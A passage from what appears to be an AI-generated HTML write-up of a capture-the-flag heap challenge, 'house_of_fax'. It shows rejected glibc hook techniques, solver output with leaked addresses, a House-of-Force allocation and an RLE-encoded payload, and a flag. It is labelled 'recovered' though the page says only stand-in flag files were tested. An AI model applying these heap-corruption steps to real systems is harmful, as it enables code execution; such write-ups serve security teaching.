+          <text x="815" y="150" text-anchor="middle" font-size="21" fill="#191510">win()</text>
+
+          <line x1="216" y1="137" x2="274" y2="137" stroke="#8f2d14" stroke-width="3" marker-end="url(#arrow4)"/>
+          <line x1="474" y1="137" x2="532" y2="137" stroke="#8f2d14" stroke-width="3" marker-end="url(#arrow4)"/>
+          <line x1="682" y1="137" x2="740" y2="137" stroke="#8f2d14" stroke-width="3" marker-end="url(#arrow4)"/>
+        </svg>
+      </div>
+
+      <h2>What Was Tried and Rejected</h2>
+      <p>Several other routes were explored but not validated for this binary/runtime pair:</p>
+      <ul>
+        <li><code>__malloc_hook</code> overwrite</li>
+        <li><code>_IO_list_all</code> / fake FILE structure</li>
+        <li>exit callback / atexit structure corruption</li>
+        <li><code>__free_hook -&gt; system</code></li>
+        <li><code>__free_hook -&gt; puts</code></li>
+        <li>common glibc 2.27 one-gadgets</li>
+      </ul>
+
+      <p>Those ideas were reasonable, but they were not stable here. The direct <code>win()</code> path and the <code>setcontext</code> pivot were the two methods that actually held up under testing.</p>
+
+      <h2>Interpreting the Solver Transcript</h2>
+      <p>The following transcript is the exact output you asked to include.</p>
+
+      <pre>┌──(userhonest㉿GM0HA5SM)-[~/uithack26/New folder/house_of_fax]
+└─$ python solve.py
+=== Fax Machine Transmitter ===
+
+heap @ 0x6f42010
+free() @ 0x7fdf9f090490
+
+Send image dimensions followed by RLE data.
+
+Width:  Height: Receiving 4097x8 fax...
+Width:  Height: Receiving 140598309275736x8 fax...
+Width:  Height: Receiving 384x1 fax...
+79
+33
+B80W1B3W1B3W1B3W5B1W1B3W1B13W1B3W1B2W3B3W3B4W2B2W5B9W1B4W1B3W1B9W1B3W1B3W1B2W3B3W3B2W1B2W1B2W1B3W1B1W1B6W1B4W1B5W4B3W2B4W1B3W1B2W2B5W1B3W1B3W1B5W1B1W1B3W1B1W1B1W1B7W1B1W1B6W1B4W4B2W1B3W1B3W1B4W1B3W1B3W1B5W1B3W5B2W4B1W1B5W2B7W1B2W4B2W2B8W1B1W1B3W1B3W1B4W1B3W1B3W1B5W1B3W1B3W1B1W1B3W1B1W1B5W1B1W1B5W1B3W1B3W1B2W1B8W1B1W4B4W1B4W1B3W1B3W1B5W1B3W1B3W1B1W1B3W1B1W1B3W1B1W1B2W1B3W1B4W1B3W1B2W1B4W1B3W1B1W1B7W1B5W3B3W3B4W1B3W1B3W1B2W4B2W3B2W1B3W1B1W5B2W3B4W2B3W3B2W1B6W3B82W5B1W5B3W1B10W3B10W2B5W1B16W1B9W5B6W1B5W1B2W2B3W4B2W1B12W1B2W1B3W2B2W1B3W1B8W2B3W4B6W1B5W1B5W1B4W1B3W1B3W1B1W1B12W1B5W1B1W1B3W1B1W1B10W1B3W1B3W1B4W1B5W1B5W1B5W1B3W1B3W1B1W4B8W4B2W1B2W1B4W1B11W1B3W1B3W1B3W1B5W1B5W1B6W1B3W1B3W1B1W1B3W1B8W1B4W5B2W1B1W1B10W1B3W1B3W1B2W1B6W1B5W1B6W1B3W1B3W1B1W1B3W1B8W1B7W1B2W1B3W1B9W1B3W1B3W1B2W1B6W1B5W1B5W3B2W1B3W1B2W3B2W5B2W1B7W1B8W5B2W3B2W1B3W1B2W1B85W3B8W5B1W1B6W3B16W1B4W2B7W1B2W3B15W1B3W1B11W1B1W1B5W1B3W1B7W1B3W1B2W2B5W1B7W1B1W1B3W1B1W1B1W2B2W4B3W1B2W2B10W1B2W1B1W2B6W1B7W1B3W1B3W1B5W1B4W4B5W1B1W2B2W1B1W1B3W1B2W1B1W1B1W1B9W1B3W2B2W1B3W2B8W1B1W1B1W1B3W1B5W1B3W1B3W1B3W2B2W1B5W1B3W1B2W2B2W1B8W1B4W1B3W1B5W1B7W1B1W1B1W1B3W1B5W1B3W1B3W1B5W1B1W1B5W1B3W1B2W1B3W1B8W1B4W1B3W1B1W1B3W1B7W2B1W2B3W1B5W1B3W1B3W1B1W1B3W1B1W1B5W1B3W1B3W3B2W5B2W1B4W1B3W1B2W3B2W5B1W1B3W1B2W3B3W3B3W4B2W3B2W1B5W1B3W1B82W3B2W5B1W5B2W2B58W1B3W1B1W1B5W1B8W1B61W1B1W4B2W4B5W1B59W2B6W1B5W1B4W2B60W1B5W1B5W1B4W1B57W1B3W1B1W1B3W1B1W1B3W1B4W1B58W3B3W3B3W3B3W2B136
+
+Decoded fax image:
+
+  ##      ##      ##      ##########  ##      ##                          ##      ##    ######      ######        ####    ##########                  ##
+  ##      ##                  ##      ##      ##    ######      ######    ##    ##    ##      ##  ##            ##        ##          ########      ####
+  ##      ##    ####          ##      ##      ##          ##  ##      ##  ##  ##              ##  ##            ##        ########    ##      ##      ##
+  ##      ##      ##          ##      ##########    ########  ##          ####              ##    ########    ####                ##  ##      ##      ##
+  ##      ##      ##          ##      ##      ##  ##      ##  ##          ##  ##          ##      ##      ##    ##                ##  ########        ##
+  ##      ##      ##          ##      ##      ##  ##      ##  ##      ##  ##    ##      ##        ##      ##    ##        ##      ##  ##              ##
+    ######      ######        ##      ##      ##    ########    ######    ##      ##  ##########    ######        ####      ######    ##            ######
+
+  ##########  ##########      ##                    ######                    ####          ##                                ##                  ##########
+          ##          ##    ####      ########    ##                        ##    ##      ####    ##      ##                ####      ########            ##
+        ##          ##        ##      ##      ##  ##                        ##          ##  ##      ##  ##                    ##      ##      ##        ##
+      ##          ##          ##      ##      ##  ########                ########    ##    ##        ##                      ##      ##      ##      ##
+    ##          ##            ##      ##      ##  ##      ##                ##        ##########    ##  ##                    ##      ##      ##    ##
+    ##          ##            ##      ##      ##  ##      ##                ##              ##    ##      ##                  ##      ##      ##    ##
+    ##          ##          ######    ##      ##    ######    ##########    ##              ##                ##########    ######    ##      ##    ##
+
+    ######                ##########  ##            ######                                ##        ####              ##    ######
+  ##      ##                      ##  ##          ##      ##              ##      ##    ####          ##              ##  ##      ##  ##  ####    ########
+  ##    ####                    ##    ##  ####            ##              ##      ##      ##          ##        ########          ##  ####    ##  ##      ##
+  ##  ##  ##                  ##      ####    ##      ####                ##  ##  ##      ##          ##      ##      ##      ####    ##          ##      ##
+  ####    ##                ##        ##      ##          ##              ##  ##  ##      ##          ##      ##      ##          ##  ##          ##      ##
+  ##      ##                ##        ##      ##  ##      ##              ####  ####      ##          ##      ##      ##  ##      ##  ##          ##      ##
+    ######    ##########    ##        ##      ##    ######    ##########  ##      ##    ######      ######      ########    ######    ##          ##      ##
+
+    ######    ##########  ##########    ####
+  ##      ##  ##          ##                ##
+          ##  ########    ########          ##
+      ####            ##          ##        ####
+          ##          ##          ##        ##
+  ##      ##  ##      ##  ##      ##        ##
+    ######      ######      ######      ####</pre>
+
+      <h3>What the transcript means</h3>
+      <ol>
+        <li><code>heap @ ...</code> is the leaked heap address from the banner.</li>
+        <li><code>free() @ ...</code> is the leaked libc address used to compute libc base and hook addresses.</li>
+        <li><code>Receiving 4097x8 fax...</code> is stage 1, the large bitmap used to corrupt the top chunk.</li>
+        <li><code>Receiving 140598309275736x8 fax...</code> is the huge House-of-Force allocation request used to move the top chunk to libc.</li>
+        <li><code>Receiving 384x1 fax...</code> is the small stage-3 allocation that overwrites the hook.</li>
+        <li>The long <code>B...W...</code> line is the RLE encoding of the stage-3 payload.</li>
+        <li>The decoded fax image is just the program rendering the payload bits as a monochrome image before it calls <code>free()</code>.</li>
+      </ol>
+
+      <p>So that output is not random noise. It is the visible proof that the exploit progressed through all three stages and delivered the final payload.</p>
+
+      <h2>Final Notes</h2>
+      <p>There are two verified exploit files in the workspace:</p>
+      <ul>
+        <li><a href="/home/userhonest/uithack26/New%20folder/house_of_fax/solve.py">solve.py</a> - the primary <code>__free_hook -&gt; win()</code> exploit</li>
+        <li><a href="/home/userhonest/uithack26/New%20folder/house_of_fax/solve_setcontext.py">solve_setcontext.py</a> - the alternate <code>setcontext</code> pivot exploit</li>
+      </ul>
+
+      <div class="good">
+        <p><strong>Recovered flag:</strong> <code>UiTHack26{5p1771n6_f4x_1n70_7h3_w1ld3rn355}</code></p>
+      </div>
+
+      <p>Both were verified locally using temporary test <code>flag.txt</code> files. The real challenge flag is not present in the current local workspace, so the final real flag only appears if the challenge environment contains the intended <code>flag.txt</code>.</p>
+
+      <div class="note">
+        <p><strong>Most important takeaway:</strong> this challenge is a clean example of how a single missing bounds check in a decoder can be transformed into a top-chunk overwrite, then into a libc hook overwrite, and finally into reliable code execution.</p>
+      </div>
+
+      <div class="footer">
+        Full writeup generated in the local challenge workspace for <code>house_of_fax</code>. This document is self-contained and intended to be opened directly in a browser.
+      </div>
+    </div>
+  </main>
+</body>
+</html>
